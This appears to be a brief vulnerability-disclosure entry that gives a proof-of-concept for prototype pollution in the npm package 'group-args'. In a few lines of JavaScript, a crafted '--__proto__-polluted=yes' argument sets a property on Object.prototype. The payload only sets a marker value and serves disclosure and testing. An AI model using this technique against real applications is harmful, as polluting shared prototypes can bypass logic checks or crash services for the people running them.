# group-args

- package name: `group-args`

- PoC exploit:

```javascript
var groupArgs = require('group-args');

groupArgs('__proto__', {argv: ['/bin/test', '--__proto__-polluted=yes']});
// Object.prototype.polluted === 'yes'
```